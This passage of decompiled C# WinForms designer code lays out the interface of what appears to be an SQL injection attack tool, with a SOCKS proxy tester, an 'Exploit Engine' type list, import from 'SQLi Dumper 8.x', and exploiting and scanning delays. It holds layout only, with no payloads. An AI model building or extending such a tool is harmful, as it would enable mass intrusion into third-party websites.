		this.tsSocks.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSocks.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsSocks.Size = new System.Drawing.Size(619, 32);
		this.tsSocks.TabIndex = 27;
		this.lblSocksCount.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.lblSocksCount.Name = "lblSocksCount";
		this.lblSocksCount.Size = new System.Drawing.Size(125, 29);
		this.lblSocksCount.Text = "lblSocksCount";
		this.btnSocksClear.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnSocksClear.Image = ns0.Class6.delete;
		this.btnSocksClear.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSocksClear.Name = "btnSocksClear";
		this.btnSocksClear.Size = new System.Drawing.Size(28, 29);
		this.btnSocksClear.Text = "&Clear";
		this.ToolStripSeparator15.Name = "ToolStripSeparator15";
		this.ToolStripSeparator15.Size = new System.Drawing.Size(6, 32);
		this.btnSocksUrl.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnSocksUrl.Image = ns0.Class6.RunUpdate_16x_24;
		this.btnSocksUrl.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSocksUrl.Name = "btnSocksUrl";
		this.btnSocksUrl.Size = new System.Drawing.Size(28, 29);
		this.btnSocksUrl.Text = "URL";
		this.ToolStripSeparator16.Name = "ToolStripSeparator16";
		this.ToolStripSeparator16.Size = new System.Drawing.Size(6, 32);
		this.btnSocksAppend.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnSocksAppend.Image = ns0.Class6.clipboard_16xLG;
		this.btnSocksAppend.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSocksAppend.Name = "btnSocksAppend";
		this.btnSocksAppend.Size = new System.Drawing.Size(28, 29);
		this.btnSocksAppend.Text = "&Apprend";
		this.ToolStripSeparator17.Name = "ToolStripSeparator17";
		this.ToolStripSeparator17.Size = new System.Drawing.Size(6, 32);
		this.btnSocksNew.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnSocksNew.Image = ns0.Class6.AddToCollection_ActionGray_16x_24;
		this.btnSocksNew.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSocksNew.Name = "btnSocksNew";
		this.btnSocksNew.Size = new System.Drawing.Size(28, 29);
		this.btnSocksNew.Text = "&Add";
		this.ToolStripSeparator14.Name = "ToolStripSeparator14";
		this.ToolStripSeparator14.Size = new System.Drawing.Size(6, 32);
		this.btnSocksMyIP.CheckOnClick = true;
		this.btnSocksMyIP.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnSocksMyIP.Image = ns0.Class6.IPAddressControl_16x_24;
		this.btnSocksMyIP.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSocksMyIP.Name = "btnSocksMyIP";
		this.btnSocksMyIP.Size = new System.Drawing.Size(28, 29);
		this.btnSocksMyIP.Text = "&Include MyIP";
		this.ToolStripLabel9.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.ToolStripLabel9.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		this.ToolStripLabel9.Name = "ToolStripLabel9";
		this.ToolStripLabel9.RightToLeftAutoMirrorImage = true;
		this.ToolStripLabel9.Size = new System.Drawing.Size(0, 29);
		this.btnSocksTest.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnSocksTest.Image = ns0.Class6.RunThread_16x_24;
		this.btnSocksTest.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSocksTest.Name = "btnSocksTest";
		this.btnSocksTest.Size = new System.Drawing.Size(139, 29);
		this.btnSocksTest.Text = "&Test Proxies..";
		this.pnlSettings.AutoScroll = true;
		this.pnlSettings.Controls.Add(this.GroupBox2);
		this.pnlSettings.Controls.Add(this.grbUpdater);
		this.pnlSettings.Controls.Add(this.grbAppSetthings);
		this.pnlSettings.Controls.Add(this.GroupBox4);
		this.pnlSettings.Controls.Add(this.grbExploithing);
		this.pnlSettings.Controls.Add(this.GroupBox1);
		this.pnlSettings.Location = new System.Drawing.Point(1525, 18);
		this.pnlSettings.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSettings.Name = "pnlSettings";
		this.pnlSettings.Size = new System.Drawing.Size(612, 904);
		this.pnlSettings.TabIndex = 4;
		this.pnlSettings.Visible = false;
		this.GroupBox2.Controls.Add(this.prbImport);
		this.GroupBox2.Controls.Add(this.btnXmlImport8x);
		this.GroupBox2.Location = new System.Drawing.Point(3, 655);
		this.GroupBox2.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.GroupBox2.Name = "GroupBox2";
		this.GroupBox2.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.GroupBox2.Size = new System.Drawing.Size(579, 68);
		this.GroupBox2.TabIndex = 7;
		this.GroupBox2.TabStop = false;
		this.GroupBox2.Text = "Import Injectables from SQLi Dumper 8.x";
		this.GroupBox2.Visible = false;
		this.prbImport.Location = new System.Drawing.Point(69, 28);
		this.prbImport.Name = "prbImport";
		this.prbImport.Size = new System.Drawing.Size(296, 23);
		this.prbImport.TabIndex = 3;
		this.btnXmlImport8x.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnXmlImport8x.Location = new System.Drawing.Point(372, 23);
		this.btnXmlImport8x.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnXmlImport8x.Name = "btnXmlImport8x";
		this.btnXmlImport8x.Size = new System.Drawing.Size(148, 30);
		this.btnXmlImport8x.TabIndex = 2;
		this.btnXmlImport8x.Text = "Import..";
		this.btnXmlImport8x.UseVisualStyleBackColor = true;
		this.grbUpdater.Controls.Add(this.cmbUpdater);
		this.grbUpdater.Controls.Add(this.chkUpdater);
		this.grbUpdater.Controls.Add(this.btnUpdater);
		this.grbUpdater.Location = new System.Drawing.Point(3, 739);
		this.grbUpdater.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbUpdater.Name = "grbUpdater";
		this.grbUpdater.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbUpdater.Size = new System.Drawing.Size(579, 68);
		this.grbUpdater.TabIndex = 5;
		this.grbUpdater.TabStop = false;
		this.grbUpdater.Text = "APP Update";
		this.grbUpdater.Visible = false;
		this.cmbUpdater.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.cmbUpdater.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbUpdater.Enabled = false;
		this.cmbUpdater.FlatStyle = System.Windows.Forms.FlatStyle.System;
		this.cmbUpdater.FormattingEnabled = true;
		this.cmbUpdater.Location = new System.Drawing.Point(222, 26);
		this.cmbUpdater.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.cmbUpdater.Name = "cmbUpdater";
		this.cmbUpdater.Size = new System.Drawing.Size(144, 28);
		this.cmbUpdater.TabIndex = 7;
		this.chkUpdater.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkUpdater.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkUpdater.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkUpdater.Location = new System.Drawing.Point(8, 25);
		this.chkUpdater.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkUpdater.Name = "chkUpdater";
		this.chkUpdater.Size = new System.Drawing.Size(208, 32);
		this.chkUpdater.TabIndex = 6;
		this.chkUpdater.Text = "Check frequency ";
		this.chkUpdater.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkUpdater.UseVisualStyleBackColor = true;
		this.btnUpdater.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnUpdater.Location = new System.Drawing.Point(372, 26);
		this.btnUpdater.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnUpdater.Name = "btnUpdater";
		this.btnUpdater.Size = new System.Drawing.Size(148, 30);
		this.btnUpdater.TabIndex = 0;
		this.btnUpdater.Text = "Check";
		this.btnUpdater.UseVisualStyleBackColor = true;
		this.grbAppSetthings.Controls.Add(this.btnSettingSave);
		this.grbAppSetthings.Controls.Add(this.btnSettingReLoad);
		this.grbAppSetthings.Controls.Add(this.btnSettingReset);
		this.grbAppSetthings.Location = new System.Drawing.Point(3, 515);
		this.grbAppSetthings.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbAppSetthings.Name = "grbAppSetthings";
		this.grbAppSetthings.Padding = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.grbAppSetthings.Size = new System.Drawing.Size(579, 68);
		this.grbAppSetthings.TabIndex = 4;
		this.grbAppSetthings.TabStop = false;
		this.grbAppSetthings.Text = "Settings";
		this.btnSettingSave.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnSettingSave.Location = new System.Drawing.Point(69, 23);
		this.btnSettingSave.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnSettingSave.Name = "btnSettingSave";
		this.btnSettingSave.Size = new System.Drawing.Size(148, 30);
		this.btnSettingSave.TabIndex = 0;
		this.btnSettingSave.Text = "Save";
		this.btnSettingSave.UseVisualStyleBackColor = true;
		this.btnSettingReLoad.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnSettingReLoad.Location = new System.Drawing.Point(219, 23);
		this.btnSettingReLoad.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnSettingReLoad.Name = "btnSettingReLoad";
		this.btnSettingReLoad.Size = new System.Drawing.Size(148, 30);
		this.btnSettingReLoad.TabIndex = 1;
		this.btnSettingReLoad.Text = "ReLoaded";
		this.btnSettingReLoad.UseVisualStyleBackColor = true;
		this.btnSettingReset.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnSettingReset.Location = new System.Drawing.Point(372, 23);
		this.btnSettingReset.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnSettingReset.Name = "btnSettingReset";
		this.btnSettingReset.Size = new System.Drawing.Size(148, 30);
		this.btnSettingReset.TabIndex = 2;
		this.btnSettingReset.Text = "Reset All";
		this.btnSettingReset.UseVisualStyleBackColor = true;
		this.GroupBox4.Controls.Add(this.lblGuiStyle);
		this.GroupBox4.Controls.Add(this.cmbGuiStyle);
		this.GroupBox4.Controls.Add(this.lblLanguage);
		this.GroupBox4.Controls.Add(this.cmbLanguages);
		this.GroupBox4.Controls.Add(this.cmbGUIHotKey);
		this.GroupBox4.Controls.Add(this.btnSkinN);
		this.GroupBox4.Controls.Add(this.btnSkinP);
		this.GroupBox4.Controls.Add(this.cmbSkin);
		this.GroupBox4.Controls.Add(this.chkSkin);
		this.GroupBox4.Controls.Add(this.chkGUIHotKey);
		this.GroupBox4.Controls.Add(this.chkSysTray);
		this.GroupBox4.Location = new System.Drawing.Point(3, 353);
		this.GroupBox4.Name = "GroupBox4";
		this.GroupBox4.Size = new System.Drawing.Size(579, 165);
		this.GroupBox4.TabIndex = 3;
		this.GroupBox4.TabStop = false;
		this.GroupBox4.Text = "GUI Skin";
		this.lblGuiStyle.Location = new System.Drawing.Point(8, 94);
		this.lblGuiStyle.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblGuiStyle.Name = "lblGuiStyle";
		this.lblGuiStyle.Size = new System.Drawing.Size(202, 26);
		this.lblGuiStyle.TabIndex = 36;
		this.lblGuiStyle.Text = "GUI Style";
		this.lblGuiStyle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.cmbGuiStyle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.cmbGuiStyle.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbGuiStyle.FormattingEnabled = true;
		this.cmbGuiStyle.Location = new System.Drawing.Point(8, 124);
		this.cmbGuiStyle.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.cmbGuiStyle.Name = "cmbGuiStyle";
		this.cmbGuiStyle.Size = new System.Drawing.Size(204, 28);
		this.cmbGuiStyle.TabIndex = 35;
		this.lblLanguage.Location = new System.Drawing.Point(8, 28);
		this.lblLanguage.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblLanguage.Name = "lblLanguage";
		this.lblLanguage.Size = new System.Drawing.Size(202, 26);
		this.lblLanguage.TabIndex = 34;
		this.lblLanguage.Text = "Language";
		this.lblLanguage.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.cmbLanguages.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.cmbLanguages.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbLanguages.FormattingEnabled = true;
		this.cmbLanguages.Location = new System.Drawing.Point(8, 58);
		this.cmbLanguages.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.cmbLanguages.Name = "cmbLanguages";
		this.cmbLanguages.Size = new System.Drawing.Size(204, 28);
		this.cmbLanguages.TabIndex = 7;
		this.cmbGUIHotKey.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.cmbGUIHotKey.Enabled = false;
		this.cmbGUIHotKey.FormattingEnabled = true;
		this.cmbGUIHotKey.Location = new System.Drawing.Point(498, 124);
		this.cmbGUIHotKey.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.cmbGUIHotKey.Name = "cmbGUIHotKey";
		this.cmbGUIHotKey.Size = new System.Drawing.Size(70, 28);
		this.cmbGUIHotKey.TabIndex = 5;
		this.btnSkinN.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnSkinN.Font = new System.Drawing.Font("Microsoft Sans Serif", 6f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.btnSkinN.Location = new System.Drawing.Point(498, 58);
		this.btnSkinN.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnSkinN.Name = "btnSkinN";
		this.btnSkinN.Size = new System.Drawing.Size(70, 30);
		this.btnSkinN.TabIndex = 2;
		this.btnSkinN.Text = ">>";
		this.btnSkinN.UseVisualStyleBackColor = true;
		this.btnSkinP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnSkinP.Enabled = false;
		this.btnSkinP.Font = new System.Drawing.Font("Microsoft Sans Serif", 6f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.btnSkinP.Location = new System.Drawing.Point(426, 58);
		this.btnSkinP.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnSkinP.Name = "btnSkinP";
		this.btnSkinP.Size = new System.Drawing.Size(70, 30);
		this.btnSkinP.TabIndex = 3;
		this.btnSkinP.Text = "<<";
		this.btnSkinP.UseVisualStyleBackColor = true;
		this.cmbSkin.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.cmbSkin.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSkin.Font = new System.Drawing.Font("Courier New", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.cmbSkin.FormattingEnabled = true;
		this.cmbSkin.Location = new System.Drawing.Point(219, 58);
		this.cmbSkin.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.cmbSkin.Name = "cmbSkin";
		this.cmbSkin.Size = new System.Drawing.Size(202, 28);
		this.cmbSkin.TabIndex = 1;
		this.chkSkin.AutoSize = true;
		this.chkSkin.Checked = true;
		this.chkSkin.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkSkin.Location = new System.Drawing.Point(218, 26);
		this.chkSkin.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkSkin.Name = "chkSkin";
		this.chkSkin.Size = new System.Drawing.Size(177, 24);
		this.chkSkin.TabIndex = 0;
		this.chkSkin.Text = "Enable App skinned";
		this.chkSkin.UseVisualStyleBackColor = true;
		this.chkGUIHotKey.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkGUIHotKey.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkGUIHotKey.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkGUIHotKey.Location = new System.Drawing.Point(217, 96);
		this.chkGUIHotKey.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkGUIHotKey.Name = "chkGUIHotKey";
		this.chkGUIHotKey.Size = new System.Drawing.Size(273, 32);
		this.chkGUIHotKey.TabIndex = 4;
		this.chkGUIHotKey.Text = "&GUI Show/Hide hot key (Alt+?)";
		this.chkGUIHotKey.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkGUIHotKey.UseVisualStyleBackColor = true;
		this.chkSysTray.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.chkSysTray.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkSysTray.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkSysTray.Location = new System.Drawing.Point(217, 128);
		this.chkSysTray.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkSysTray.Name = "chkSysTray";
		this.chkSysTray.Size = new System.Drawing.Size(273, 32);
		this.chkSysTray.TabIndex = 6;
		this.chkSysTray.Text = "&Minimize to System Tray";
		this.chkSysTray.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkSysTray.UseVisualStyleBackColor = true;
		this.grbExploithing.Controls.Add(this.lstExpoitType);
		this.grbExploithing.Location = new System.Drawing.Point(3, 256);
		this.grbExploithing.Name = "grbExploithing";
		this.grbExploithing.Size = new System.Drawing.Size(579, 97);
		this.grbExploithing.TabIndex = 2;
		this.grbExploithing.TabStop = false;
		this.grbExploithing.Text = "Exploit Engine";
		this.lstExpoitType.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.lstExpoitType.CheckOnClick = true;
		this.lstExpoitType.FormattingEnabled = true;
		this.lstExpoitType.IntegralHeight = false;
		this.lstExpoitType.Location = new System.Drawing.Point(8, 22);
		this.lstExpoitType.MultiColumn = true;
		this.lstExpoitType.Name = "lstExpoitType";
		this.lstExpoitType.Size = new System.Drawing.Size(562, 62);
		this.lstExpoitType.TabIndex = 0;
		this.lstExpoitType.ThreeDCheckBoxes = true;
		this.lstExpoitType.UseTabStops = false;
		this.GroupBox1.Controls.Add(this.chkScanningBlackListProxy);
		this.GroupBox1.Controls.Add(this.txtAccept);
		this.GroupBox1.Controls.Add(this.txtUserAgent);
		this.GroupBox1.Controls.Add(this.lblHTTPdelay);
		this.GroupBox1.Controls.Add(this.numExploitingDelay);
		this.GroupBox1.Controls.Add(this.numHTTPTimeout);
		this.GroupBox1.Controls.Add(this.lblHTTPretry);
		this.GroupBox1.Controls.Add(this.numHTTPRetry);
		this.GroupBox1.Controls.Add(this.lblHTTPtimeout);
		this.GroupBox1.Controls.Add(this.numScanningDelay);
		this.GroupBox1.Controls.Add(this.lblHTTPdelayIP);
		this.GroupBox1.Controls.Add(this.lblAccept);
		this.GroupBox1.Controls.Add(this.lblUserAgent);
		this.GroupBox1.Location = new System.Drawing.Point(3, 3);
		this.GroupBox1.Name = "GroupBox1";
		this.GroupBox1.Size = new System.Drawing.Size(579, 253);
		this.GroupBox1.TabIndex = 0;
		this.GroupBox1.TabStop = false;
		this.GroupBox1.Text = "HTTP General";
		this.chkScanningBlackListProxy.AutoSize = true;
		this.chkScanningBlackListProxy.Checked = true;
		this.chkScanningBlackListProxy.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkScanningBlackListProxy.Location = new System.Drawing.Point(8, 149);
		this.chkScanningBlackListProxy.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkScanningBlackListProxy.Name = "chkScanningBlackListProxy";
		this.chkScanningBlackListProxy.Size = new System.Drawing.Size(278, 24);
		this.chkScanningBlackListProxy.TabIndex = 38;
		this.chkScanningBlackListProxy.Text = "Enable Scanner Proxy IP BlackList";
		this.chkScanningBlackListProxy.UseVisualStyleBackColor = true;
		this.txtAccept.Location = new System.Drawing.Point(134, 211);
		this.txtAccept.Name = "txtAccept";
		this.txtAccept.Size = new System.Drawing.Size(434, 26);
		this.txtAccept.TabIndex = 36;
		this.txtAccept.Text = "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8";
		this.txtUserAgent.Location = new System.Drawing.Point(134, 178);
		this.txtUserAgent.Name = "txtUserAgent";
		this.txtUserAgent.Size = new System.Drawing.Size(434, 26);
		this.txtUserAgent.TabIndex = 34;
		this.txtUserAgent.Text = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0";
		this.lblHTTPdelay.Location = new System.Drawing.Point(130, 118);
		this.lblHTTPdelay.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblHTTPdelay.Name = "lblHTTPdelay";
		this.lblHTTPdelay.Size = new System.Drawing.Size(438, 26);
		this.lblHTTPdelay.TabIndex = 33;
		this.lblHTTPdelay.Text = "Exploiting Delay (ms)";
		this.lblHTTPdelay.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.numExploitingDelay.Increment = new decimal(new int[4] { 200, 0, 0, 0 });
		this.numExploitingDelay.Location = new System.Drawing.Point(8, 117);
		this.numExploitingDelay.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.numExploitingDelay.Maximum = new decimal(new int[4] { 50000, 0, 0, 0 });
		this.numExploitingDelay.Minimum = new decimal(new int[4] { 100, 0, 0, 0 });
		this.numExploitingDelay.Name = "numExploitingDelay";
		this.numExploitingDelay.Size = new System.Drawing.Size(112, 26);
		this.numExploitingDelay.TabIndex = 4;
		this.numExploitingDelay.Value = new decimal(new int[4] { 200, 0, 0, 0 });
		this.numHTTPTimeout.Location = new System.Drawing.Point(8, 25);
		this.numHTTPTimeout.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.numHTTPTimeout.Maximum = new decimal(new int[4] { 60, 0, 0, 0 });
		this.numHTTPTimeout.Minimum = new decimal(new int[4] { 5, 0, 0, 0 });
		this.numHTTPTimeout.Name = "numHTTPTimeout";
		this.numHTTPTimeout.Size = new System.Drawing.Size(112, 26);
		this.numHTTPTimeout.TabIndex = 0;
		this.numHTTPTimeout.Value = new decimal(new int[4] { 20, 0, 0, 0 });
		this.lblHTTPretry.Location = new System.Drawing.Point(130, 55);
		this.lblHTTPretry.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblHTTPretry.Name = "lblHTTPretry";
		this.lblHTTPretry.Size = new System.Drawing.Size(438, 26);
		this.lblHTTPretry.TabIndex = 9;
		this.lblHTTPretry.Text = "Request Retry Limit";
		this.lblHTTPretry.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.numHTTPRetry.Increment = new decimal(new int[4] { 5, 0, 0, 0 });
		this.numHTTPRetry.Location = new System.Drawing.Point(8, 54);
		this.numHTTPRetry.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.numHTTPRetry.Maximum = new decimal(new int[4] { 60, 0, 0, 0 });
		this.numHTTPRetry.Minimum = new decimal(new int[4] { 3, 0, 0, 0 });
		this.numHTTPRetry.Name = "numHTTPRetry";
		this.numHTTPRetry.Size = new System.Drawing.Size(112, 26);
		this.numHTTPRetry.TabIndex = 1;
		this.numHTTPRetry.Value = new decimal(new int[4] { 10, 0, 0, 0 });
		this.lblHTTPtimeout.Location = new System.Drawing.Point(130, 25);
		this.lblHTTPtimeout.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblHTTPtimeout.Name = "lblHTTPtimeout";
		this.lblHTTPtimeout.Size = new System.Drawing.Size(438, 26);
		this.lblHTTPtimeout.TabIndex = 7;
		this.lblHTTPtimeout.Text = "Connection Timeout (Secunds)";
		this.lblHTTPtimeout.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.numScanningDelay.Increment = new decimal(new int[4] { 1000, 0, 0, 0 });
		this.numScanningDelay.Location = new System.Drawing.Point(8, 85);
		this.numScanningDelay.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.numScanningDelay.Maximum = new decimal(new int[4] { 60000, 0, 0, 0 });
		this.numScanningDelay.Minimum = new decimal(new int[4] { 1000, 0, 0, 0 });
		this.numScanningDelay.Name = "numScanningDelay";
		this.numScanningDelay.Size = new System.Drawing.Size(112, 26);
		this.numScanningDelay.TabIndex = 2;
		this.numScanningDelay.Value = new decimal(new int[4] { 5000, 0, 0, 0 });
		this.lblHTTPdelayIP.Location = new System.Drawing.Point(130, 86);
		this.lblHTTPdelayIP.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblHTTPdelayIP.Name = "lblHTTPdelayIP";
		this.lblHTTPdelayIP.Size = new System.Drawing.Size(438, 26);
		this.lblHTTPdelayIP.TabIndex = 30;
		this.lblHTTPdelayIP.Text = "Scanner Delay per IP (Proxies) (ms)";
		this.lblHTTPdelayIP.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.lblAccept.Location = new System.Drawing.Point(10, 211);
		this.lblAccept.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblAccept.Name = "lblAccept";
		this.lblAccept.Size = new System.Drawing.Size(110, 26);
		this.lblAccept.TabIndex = 37;
		this.lblAccept.Text = "Accept";
		this.lblAccept.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblUserAgent.Location = new System.Drawing.Point(10, 178);
		this.lblUserAgent.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblUserAgent.Name = "lblUserAgent";
		this.lblUserAgent.Size = new System.Drawing.Size(110, 26);
		this.lblUserAgent.TabIndex = 35;
		this.lblUserAgent.Text = "User Agent";
		this.lblUserAgent.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.btnExcludeUrlWords.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnExcludeUrlWords.Enabled = false;
		this.btnExcludeUrlWords.Location = new System.Drawing.Point(417, 14);
		this.btnExcludeUrlWords.Name = "btnExcludeUrlWords";
		this.btnExcludeUrlWords.Size = new System.Drawing.Size(140, 31);
		this.btnExcludeUrlWords.TabIndex = 1;
		this.btnExcludeUrlWords.Text = "Add";
		this.btnExcludeUrlWords.UseVisualStyleBackColor = true;
		this.lstExcludeUrlWords.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.lstExcludeUrlWords.ContextMenuStrip = this.mnuExcludeUrlWords;
		this.lstExcludeUrlWords.FormattingEnabled = true;
		this.lstExcludeUrlWords.IntegralHeight = false;
		this.lstExcludeUrlWords.ItemHeight = 20;
		this.lstExcludeUrlWords.Location = new System.Drawing.Point(3, 52);
		this.lstExcludeUrlWords.Name = "lstExcludeUrlWords";
		this.lstExcludeUrlWords.SelectionMode = System.Windows.Forms.SelectionMode.MultiExtended;
		this.lstExcludeUrlWords.Size = new System.Drawing.Size(553, 104);
		this.lstExcludeUrlWords.TabIndex = 2;
		this.mnuExcludeUrlWords.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuExcludeUrlWords.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.mnuExcludeUrlWordsRemove });
		this.mnuExcludeUrlWords.Name = "mnuChecked";
		this.mnuExcludeUrlWords.ShowImageMargin = false;
		this.mnuExcludeUrlWords.ShowItemToolTips = false;
		this.mnuExcludeUrlWords.Size = new System.Drawing.Size(124, 34);
		this.mnuExcludeUrlWordsRemove.Name = "mnuExcludeUrlWordsRemove";
		this.mnuExcludeUrlWordsRemove.Size = new System.Drawing.Size(123, 30);
		this.mnuExcludeUrlWordsRemove.Text = "Remove";
		this.txtExcludeUrlWords.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtExcludeUrlWords.CharacterCasing = System.Windows.Forms.CharacterCasing.Lower;
		this.txtExcludeUrlWords.Location = new System.Drawing.Point(100, 14);
		this.txtExcludeUrlWords.Name = "txtExcludeUrlWords";
		this.txtExcludeUrlWords.Size = new System.Drawing.Size(308, 26);
		this.txtExcludeUrlWords.TabIndex = 0;
		this.lblSkipWordURL.AutoSize = true;
		this.lblSkipWordURL.Location = new System.Drawing.Point(8, 20);
		this.lblSkipWordURL.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblSkipWordURL.Name = "lblSkipWordURL";
		this.lblSkipWordURL.Size = new System.Drawing.Size(86, 20);
		this.lblSkipWordURL.TabIndex = 33;
		this.lblSkipWordURL.Text = "Skip words";
